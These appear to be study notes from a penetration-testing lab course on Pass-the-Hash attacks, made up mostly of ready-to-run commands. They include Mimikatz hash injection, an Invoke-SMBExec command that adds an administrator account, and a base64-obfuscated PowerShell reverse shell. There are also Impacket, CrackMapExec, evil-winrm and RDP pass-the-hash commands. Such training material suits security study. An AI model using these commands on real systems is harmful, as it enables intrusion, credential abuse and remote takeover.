
> [!NOTE] PtH
> - Dumping the local SAM database from a compromised host.
> - Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
> - Pulling the hashes from memory (lsass.exe).

### Mimikatz PtH (Windows)

> [!NOTE]
> The Mimikatz module `sekurlsa::pth`, allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. This requires a few dependencies:
> - `/user` Username to impersonate
> - `/rc4` or `/NTLM`  NTLM hash of the user's password
> - `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.)
> - `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe)

##### Example: PtH from Windows Using Mimikatz
```go
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

### PowerShell Invoke-TheHash (Windows)


> [!summary]
> This is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

Two options to execute: SMBA or WMI command execution. 

#### Invoke-TheHash Parameters

|            |                                                                                                                                                           |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Target`   | Hostname or IP address of the target                                                                                                                      |
| `Username` | Username to use for authentication.                                                                                                                       |
| `Domain`   | Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username                          |
| `Hash`     | NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format                                                            |
| `Command`  | Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target |

#### Invoke-TheHash SMB

```go
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### Invoke-TheHash WMI

This creates a reverse shell on DC01
```go
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```


---
### PtH Linux

[Impacket](https://github.com/fortra/impacket) has tools for Command Execution, Credential Dumping and Enumeration. 

#### PtH w/ Impacket PsExec
```go
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

These other tools in the Impacket suite can also be used to PtH:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

#### PtH w/ CrackMapExec(Linux)

```go
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> [! Important ]
>To authenticate to each host while executing the above, use the `-local-auth` switch. If we  see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands.
>
>Check out the crackmapexe wikie here [CrackMapExec documentation Wiki](https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/)

### PtH w/ evil-winrm(Linux)
```go
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### PtH w/ RDP (Linux)

Passing the hash with RDP has a caveat:
Restricted Admin Mode, disabled by default, this should be enabled or you'll get the below error message:
![[Pasted image 20250517185320.png]]

Enable by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.

```go
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

When the registry key is added use `xfreerdp` with the `/pth` option to gain RDP access:

```go
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

